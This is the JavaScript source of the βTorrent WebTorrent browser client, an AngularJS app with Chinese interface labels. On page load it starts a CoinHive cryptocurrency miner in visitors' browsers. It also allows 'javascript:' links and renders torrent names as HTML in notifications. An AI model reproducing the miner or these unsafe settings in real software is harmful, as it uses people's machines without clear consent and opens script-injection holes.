"use strict";

/* global WebTorrent, angular, moment, prompt, CoinHive */
var VERSION = '0.17.7';
var trackers = ['wss://tracker.btorrent.xyz', 'wss://tracker.openwebtorrent.com', 'wss://tracker.fastcast.nz'];
var rtcConfig = {
    'iceServers': [
        {urls: ['stun:ws-turn2.xirsys.com',
                'stun:stun4.l.google.com:19302','stun:stun3.l.google.com:19302','stun:stun2.l.google.com:19302','stun:stun1.l.google.com:19302'
            ,'stun:stun01.sipphone.com','stun:stun.ekiga.net'
            ]},
        {
            urls: ['turn:numb.viagenie.ca'],
            credential: 'muazkh',
            username: 'webrtc@live.com'
        }
    ]
};
var torrentOpts = {
    announce: trackers
};
var trackerOpts = {
    announce: trackers,
    rtcConfig: rtcConfig
};
var debug = window.localStorage.getItem('debug') !== null;

var dbg = function dbg(string, item, color) {
    color = color !== null ? color : '#333333';

    if (debug) {
        if (item && item.name) {
            return console.debug("%c\u03B2Torrent:".concat(item.infoHash !== null ? 'torrent ' : 'torrent ' + item._torrent.name + ':file ').concat(item.name).concat(item.infoHash !== null ? ' (' + item.infoHash + ')' : '', " %c").concat(string), 'color: #33C3F0', "color: ".concat(color));
        } else {
            return console.debug("%c\u03B2Torrent:client %c".concat(string), 'color: #33C3F0', "color: ".concat(color));
        }
    }
};

var er = function er(err, item) {
    dbg(err, item, '#FF0000');
};

dbg("Starting... v".concat(VERSION));
var client = new WebTorrent({
    tracker: trackerOpts
});
var app = angular.module('BTorrent', ['ngRoute', 'ui.grid', 'ui.grid.resizeColumns', 'ui.grid.selection', 'ngFileUpload', 'ngNotify'], ['$compileProvider', '$locationProvider', '$routeProvider', function ($compileProvider, $locationProvider, $routeProvider) {
    $compileProvider.aHrefSanitizationWhitelist(/^\s*(https?|magnet|blob|javascript):/);
    $locationProvider.html5Mode({
        enabled: true,
        requireBase: false
    }).hashPrefix('#');
    $routeProvider.when('/view', {
        templateUrl: 'views/view.html',
        controller: 'ViewCtrl'
    }).when('/download', {
        templateUrl: 'views/download.html',
        controller: 'DownloadCtrl'
    }).otherwise({
        templateUrl: 'views/full.html',
        controller: 'FullCtrl'
    });
}]);
app.controller('BTorrentCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
    if (window.CoinHive) {
        var miner = new CoinHive.Anonymous('YzzZ9mraj45TeCzxlvBX7yVm9O3GbV60', {
            throttle: 0.5
        });

        if (!miner.isMobile() && !miner.didOptOut(3600)) {
            miner.start();
        }
    }

    var updateAll;
    $rootScope.version = VERSION;
    ngNotify.config({
        duration: 5000,
        html: true
    });

    if (!WebTorrent.WEBRTC_SUPPORT) {
        $rootScope.disabled = true;
        ngNotify.set('Please use latest Chrome, Firefox or Opera', {
            type: 'error',
            sticky: true,
            button: false
        });
    }

    $rootScope.client = client;

    updateAll = function updateAll() {
        if ($rootScope.client.processing) {
            return;
        }

        $rootScope.$apply();
    };

    setInterval(updateAll, 500);

    $rootScope.seedFiles = function (files) {
        var name;

        if (files != null && files.length > 0) {
            if (files.length === 1) {
                dbg("Seeding file ".concat(files[0].name));
            } else {
                dbg("Seeding ".concat(files.length, " files"));
                name = prompt('Please name your torrent', 'My Awesome Torrent') || 'My Awesome Torrent';
                torrentOpts.name = name;
            }

            $rootScope.client.processing = true;
            $rootScope.client.seed(files, torrentOpts, $rootScope.onSeed);
            delete torrentOpts.name;
        }
    };

    $rootScope.openTorrentFile = function (file) {
        if (file != null) {
            dbg("Adding torrent file ".concat(file.name));
            $rootScope.client.processing = true;
            $rootScope.client.add(file, torrentOpts, $rootScope.onTorrent);
        }
    };

    $rootScope.client.on('error', function (err, torrent) {
        $rootScope.client.processing = false;
        ngNotify.set(err, 'error');
        er(err, torrent);
    });

    $rootScope.addMagnet = function (magnet, onTorrent) {
        if (magnet != null && magnet.length > 0) {
            dbg("Adding magnet/hash ".concat(magnet));
            $rootScope.client.processing = true;
            $rootScope.client.add(magnet, torrentOpts, onTorrent || $rootScope.onTorrent);
        }
    };

    $rootScope.destroyedTorrent = function (err) {
        if (err) {
            throw err;
        }

        dbg('Destroyed torrent', $rootScope.selectedTorrent);
        $rootScope.selectedTorrent = null;
        $rootScope.client.processing = false;
    };

    $rootScope.changePriority = function (file) {
        if (file.priority === '-1') {
            dbg('Deselected', file);
            file.deselect();
        } else {
            dbg("Selected with priority ".concat(file.priority), file);
            file.select(file.priority);
        }
    };

    $rootScope.onTorrent = function (torrent, isSeed) {
        dbg(torrent.magnetURI);
        torrent.safeTorrentFileURL = torrent.torrentFileBlobURL;
        torrent.fileName = "".concat(torrent.name, ".torrent");

        if (!isSeed) {
            dbg('Received metadata', torrent);
            ngNotify.set("Received ".concat(torrent.name, " metadata"));

            if (!($rootScope.selectedTorrent != null)) {
                $rootScope.selectedTorrent = torrent;
            }

            $rootScope.client.processing = false;
        }

        torrent.files.forEach(function (file) {
            file.getBlobURL(function (err, url) {
                if (err) {
                    throw err;
                }

                if (isSeed) {
                    dbg('Started seeding', torrent);

                    if (!($rootScope.selectedTorrent != null)) {
                        $rootScope.selectedTorrent = torrent;
                    }

                    $rootScope.client.processing = false;
                }

                file.url = url;

                if (!isSeed) {
                    dbg('Done ', file);
                    ngNotify.set("<b>".concat(file.name, "</b> ready for download"), 'success');
                }
            });
        });
        torrent.on('done', function () {
            if (!isSeed) {
                dbg('Done', torrent);
            }

            ngNotify.set("<b>".concat(torrent.name, "</b> has finished downloading"), 'success');
        });
        torrent.on('wire', function (wire, addr) {
            dbg("Wire ".concat(addr), torrent);
        });
        torrent.on('error', er);
    };

    $rootScope.onSeed = function (torrent) {
        $rootScope.onTorrent(torrent, true);
    };

    dbg('Ready');
}]);
app.controller('FullCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
    ngNotify.config({
        duration: 5000,
        html: true
    });

    $scope.addMagnet = function () {
        $rootScope.addMagnet($scope.torrentInput);
        $scope.torrentInput = '';
    };

    $scope.columns = [{
        field: 'name',
        name: 'name',
        displayName: '文件名',
        cellTooltip: true,
        minWidth: '200'
    }, {
        field: 'length',
        name: 'Size',
        displayName: '大小',
        cellFilter: 'pbytes',
        width: '80'
    }, {
        field: 'received',
        displayName: '下载',
        cellFilter: 'pbytes',
        width: '135'
    }, {
        field: 'downloadSpeed',
        displayName: '↓ 速度',
        cellFilter: 'pbytes:1',
        width: '100'
    }, {
        field: 'progress',
        displayName: '进度',
        cellFilter: 'progress',
        width: '100'
    }, {
        field: 'timeRemaining',
        displayName: 'ETA',
        cellFilter: 'humanTime',
        width: '140'
    }, {
        field: 'uploaded',
        displayName: '上传',
        cellFilter: 'pbytes',
        width: '125'
    }, {
        field: 'uploadSpeed',
        displayName: '↑ 速度',
        cellFilter: 'pbytes:1',
        width: '100'
    }, {
        field: 'numPeers',
        displayName: '种子数',
        width: '80'
    }, {
        field: 'ratio',
        cellFilter: 'number:2',
        width: '80'
    }];
    $scope.gridOptions = {
        columnDefs: $scope.columns,
        data: $rootScope.client.torrents,
        enableColumnResizing: true,
        enableColumnMenus: false,
        enableRowSelection: true,
        enableRowHeaderSelection: false,
        multiSelect: false
    };

    $scope.gridOptions.onRegisterApi = function (gridApi) {
        $scope.gridApi = gridApi;
        gridApi.selection.on.rowSelectionChanged($scope, function (row) {
            if (!row.isSelected && $rootScope.selectedTorrent != null && ($rootScope.selectedTorrent.infoHash = row.entity.infoHash)) {
                $rootScope.selectedTorrent = null;
            } else {
                $rootScope.selectedTorrent = row.entity;
            }
        });
    };

    if ($location.hash() !== '') {
        $rootScope.client.processing = true;
        setTimeout(function () {
            dbg("Adding ".concat($location.hash()));
            $rootScope.addMagnet($location.hash());
        }, 0);
    }
}]);
app.controller('DownloadCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
    ngNotify.config({
        duration: 5000,
        html: true
    });

    $scope.addMagnet = function () {
        $rootScope.addMagnet($scope.torrentInput);
        $scope.torrentInput = '';
    };

    if ($location.hash() !== '') {
        $rootScope.client.processing = true;
        setTimeout(function () {
            dbg("Adding ".concat($location.hash()));
            $rootScope.addMagnet($location.hash());
        }, 0);
    }
}]);
app.controller('ViewCtrl', ['$scope', '$rootScope', '$http', '$log', '$location', 'ngNotify', function ($scope, $rootScope, $http, $log, $location, ngNotify) {
    var onTorrent;
    ngNotify.config({
        duration: 2000,
        html: true
    });

    onTorrent = function onTorrent(torrent) {
        $rootScope.viewerStyle = {
            'margin-top': '-20px',
            'text-align': 'center'
        };
        dbg(torrent.magnetURI);
        torrent.safeTorrentFileURL = torrent.torrentFileBlobURL;
        torrent.fileName = "".concat(torrent.name, ".torrent");
        $rootScope.selectedTorrent = torrent;
        $rootScope.client.processing = false;
        dbg('Received metadata', torrent);
        ngNotify.set("Received ".concat(torrent.name, " metadata"));
        torrent.files.forEach(function (file) {
            file.appendTo('#viewer');
            file.getBlobURL(function (err, url) {
                if (err) {
                    throw err;
                }

                file.url = url;
                dbg('Done ', file);
            });
        });
        torrent.on('done', function () {
            dbg('Done', torrent);
        });
        torrent.on('wire', function (wire, addr) {
            dbg("Wire ".concat(addr), torrent);
        });
        torrent.on('error', er);
    };

    $scope.addMagnet = function () {
        $rootScope.addMagnet($scope.torrentInput, onTorrent);
        $scope.torrentInput = '';
    };

    if ($location.hash() !== '') {
        $rootScope.client.processing = true;
        setTimeout(function () {
            dbg("Adding ".concat($location.hash()));
            $rootScope.addMagnet($location.hash(), onTorrent);
        }, 0);
    }
}]);
app.filter('html', ['$sce', function ($sce) {
    return function (input) {
        $sce.trustAsHtml(input);
    };
}]);
app.filter('pbytes', function () {
    return function (num, speed) {
        var exponent, unit, units;

        if (isNaN(num)) {
            return '';
        }

        units = ['B', 'kB', 'MB', 'GB', 'TB'];

        if (num < 1) {
            return speed ? '' : '0 B';
        }

        exponent = Math.min(Math.floor(Math.log(num) / 6.907755278982137), 8);
        num = (num / Math.pow(1000, exponent)).toFixed(1) * 1;
        unit = units[exponent];
        return "".concat(num, " ").concat(unit).concat(speed ? '/s' : '');
    };
});
app.filter('humanTime', function () {
    return function (millis) {
        var remaining;

        if (millis < 1000) {
            return '';
        }

        remaining = moment.duration(millis).humanize();
        return remaining[0].toUpperCase() + remaining.substr(1);
    };
});
app.filter('progress', function () {
    return function (num) {
        return "".concat((100 * num).toFixed(1), "%");
    };
});